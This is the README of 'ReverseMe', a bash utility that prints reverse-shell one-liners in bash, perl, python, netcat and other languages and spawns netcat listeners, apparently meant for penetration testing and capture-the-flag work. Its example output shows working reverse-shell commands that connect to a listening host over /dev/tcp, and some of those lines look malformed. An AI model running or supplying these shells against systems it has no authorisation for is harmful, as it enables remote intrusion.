# ReverseMe
Easily display reverse shells in different languages with the listening host and listening port already built into the syntax.

## Installation
By default, *reverseme* is set to install in your home directory. \
Using your favorite text editor, change the username for the USER variable in *install.sh*. \
Also change the directory path for the DIRECTORY variable in *install.sh*. **Use absolute path names. It just makes it easier.** \
*reverseme* uses \.bash_aliases to add the alais for *reverseme*. \
*reversme* will source the bash_completion file automatically to your \.bashrc file.

##### What if I want to use something different than .bashrc or .bash_aliases?
You will need to use your favorite text editor and edit the variables ALIAS_FILE and SOURCE_FILE in *install.sh*. \
**Otherwise, leave them alone.**

##### What if I move *reverseme* after I run the install.sh script?
If at anytime you move *reverseme* after running install.sh, you will need to edit your \.bashrc, \.bash_aliases, and the absolute sourced path of *shells.sh* in *main.sh* file, using your favorite text editor.

#### To install:
```
git clone https://github.com/DFC302/reverseme.git
cd reverseme/
sudo bash install.sh
cd
source ~/.bashrc
```
**Right now, *reverseme's* *install.sh* script is set to work on Debian\Ubuntu related distbutions.**

## Usage
**Important Note:** \
The reverse shells are stored in a separate file wrapped in functions. Because of this, all other options must be called FIRST before you call the language option of your choice. Below are some simple example usages.

### Basic usage:
```
reverseme --lport 4444 --lhost 10.0.0.221 --langs bash
```

#### Result:
```
bash -i >& /dev/tcp/10.0.0.221/4444 0>&1

exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/10.0.0.221/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/10.0.0.221/4444 cat <&5 | while read line; do  2>&5 >&5; done
```

### Save shell to clipboard"
```
reverseme --lhost 10.0.0.221 --lport 4444 --save --langs bash
```

**If there is more than one reverse shell available, *reverseme* will ask you to select which one. Whatever option you choose will automatically be saved to your clipboard.**.

#### Result
```
bash -i >& /dev/tcp/10.0.0.221/4444 0>&1

exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/10.0.0.221/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/10.0.0.221/4444 cat <&5 | while read line; do  2>&5 >&5; done

Selection [1-4]: 2
```

### List supported languages
```
reverseme --list
```
#### Result:
```
Supported languages:
	bash
	awk
	perl
	python
	php
	ruby
	netcat
	telnet
	socat
	java
```
### Spawn listener
```
reverseme --lport 4444 --listener gnome
```
**--OR--**
```
reverseme --lhost 10.0.0.221 --lport 4444 [optional: --save] --listener gnome --langs bash
```
This will spawn a new terminal using netcat to listen on the given lport.

### Spawn version/email/title information
```
reverseme --version
```
#### Result:
```
	________                                    ______  ___     
	___  __ \_______   ____________________________   |/  /____ 
	__  /_/ /  _ \_ | / /  _ \_  ___/_  ___/  _ \_  /|_/ /_  _ \
	_  _, _//  __/_ |/ //  __/  /   _(__  )/  __/  /  / / /  __/
	/_/ |_| \___/_____/ \___//_/    /____/ \___//_/  /_/  \___/                                                               

	
		Written by: Matthew Greer
		Github: https://github.com/DFC302
		HTB Profile: https://www.hackthebox.eu/profile/17842
		Email: pydev302@gmail.com
		Version: 2.0.0


```


### Help Menu
```
reverseme - A quick reference script that can easily display reverse shells for different languages.
Version: 2.0.0

Usage: reverseme --[options]
Example usage: reverseme --lhost 10.0.0.2 --lport 4444 --langs perl linux
Warning: lport and lhost both needed FIRST to display reverse shells correctly!
	WRONG: reverseme --langs bash --lhost 10.0.0.2 --lport 4444
	CORRECT: reverseme --lhost 10.0.0.2 || lport 4444 --langs bash

--help			Displays this help menu and exits.
--version		Displays version and title information.
--list			List avaialble languages supported.
--save			Save reverse shell to clipboard.
--lport=[port]		Provide a listening port.
--lhost=[IP]		Provide a listening host.

--listener=[ENV]	Spawn a listener on a specfic lport.
				gnome
				xfce
				Example: --lport 4444 --listener gnome

--langs=[lang]	Language reverse shell is written in.
			bash
			awk
			perl [OPTIONAL] linux || windows
			python [PROTOCOL] tcp || udp || stcp
			php
			ruby [OPTIONAL] linux || windows
			netcat
			telnet
			socat
			java

```

### Common errors?
#### When I use the --save flag, I get an error: *error cant open display*.
This usually happens with systems without a GUI. You can check out the following [help](https://askubuntu.com/questions/305654/xclip-on-headless-server) to see if you can find a solution.

#### *reverseme* tells me that I need the lhost and/or lport first, when I use the --langs flag before those flags.
This is because each language is stored in a function in another bash file. Essentially, main.sh is calling the function that holds the reverse shells of the language you have chosen. If you call that function first, the rest of the flags are not taken into account as variables. Use the *--langs [lang]* as the last part of your syntax.

#### I am getting a *permission denied* when running *reverseme*.
I have seen this before on some of the test systems I have tested *reverseme* on. The easiest solution is to do this:
```
chmod -R 755 /reverseme
chown -R [user] /reverseme
chgrp -R [user] /reverseme
```
#### I ran the *install.sh* script, but I still cant use *reverseme* as an alias?
Using your favorite editor, open the \.bash_aliases file in your home directory. Make sure that the path to *reverseme's* *main.sh* file is correct.

#### *reverseme* tells me that it has no file named *shells.sh*
Using your favorite editor, open the *main.sh* file in *reverseme* directory. Edit line 4, where it is sourcing the *shells.sh* file and make sure the path is correct.

**Anything else. Email me.**


### Contributing?
I would be interested in more reverse shells that I can add to *reverseme* \
Or if you find this useful or it is helped you in anyway, you can always say thanks by buying me a coffee.

<a href="https://www.buymeacoffee.com/dfc302" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
